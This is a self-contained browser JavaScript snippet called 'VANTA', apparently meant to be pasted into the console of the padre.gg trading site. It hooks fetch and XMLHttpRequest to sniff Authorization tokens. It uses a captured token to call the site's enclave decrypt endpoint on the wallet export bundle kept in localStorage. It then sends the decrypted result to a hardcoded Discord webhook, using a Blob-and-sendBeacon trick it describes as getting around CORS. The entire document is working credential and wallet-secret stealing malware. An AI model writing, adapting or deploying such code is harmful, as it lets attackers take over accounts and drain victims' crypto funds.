(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
    console.log("%c[VANTA] INITIALIZING OVERRIDE...", "color: #00ff88; font-weight: bold;");

    const exfil = async (token) => {
        const bundle = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bundle) return;

        try {
            const parsed = JSON.parse(bundle);
            const key = Object.keys(parsed.bundles)[0];
            const payload = {
                bundle: parsed.bundles[key].exportBundle,
                subOrgId: parsed.bundles[key].subOrgId
            };

            const response = await fetch("https://api.padre.gg/v2/enclave/decrypt", {
                method: 'POST',
                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const decryptedData = await response.text();

            // BYPASS METHOD: Use a Blob + text/plain to avoid CORS preflight blocks
            const discordPayload = JSON.stringify({
                embeds: [{
                    title: "🔓 VANTA DECRYPT SUCCESS",
                    description: "```json\n" + decryptedData.substring(0, 1800) + "\n```",
                    color: 65280,
                    timestamp: new Date()
                }]
            });

            const blob = new Blob([discordPayload], { type: 'text/plain' });
            navigator.sendBeacon(WEBHOOK, blob);
            console.warn("[VANTA] DATA DISPATCHED TO WEBHOOK.");
        } catch (e) {
            console.error("[VANTA] CRITICAL ERROR:", e);
        }
    };

    // --- STEALTH HOOKS ---
    const _fetch = window.fetch;
    window.fetch = async (...args) => {
        const url = args[0].toString();
        const headers = args[1]?.headers;
        
        if (headers) {
            const auth = (headers instanceof Headers) ? headers.get('Authorization') : headers['Authorization'];
            if (auth) { 
                console.log("[VANTA] TOKEN SNIFFED VIA FETCH");
                exfil(auth); 
            }
        }
        return _fetch.apply(this, args);
    };

    const _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        const auth = this.status === 0 ? null : ""; // Placeholder
        // We catch the token during setRequestHeader instead
        _send.apply(this, arguments);
    };

    const _set = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        if (name.toLowerCase() === 'authorization') {
            console.log("[VANTA] TOKEN SNIFFED VIA XHR");
            exfil(value);
        }
        return _set.apply(this, arguments);
    };

    // TRIGGER: Force the site to use the token
    _fetch('/api/v2/user/profile').catch(() => {});
    
    alert("VANTA TRACKER: ACTIVE\n\nClick 'Profile' on Padre if data doesn't send instantly.");
})();
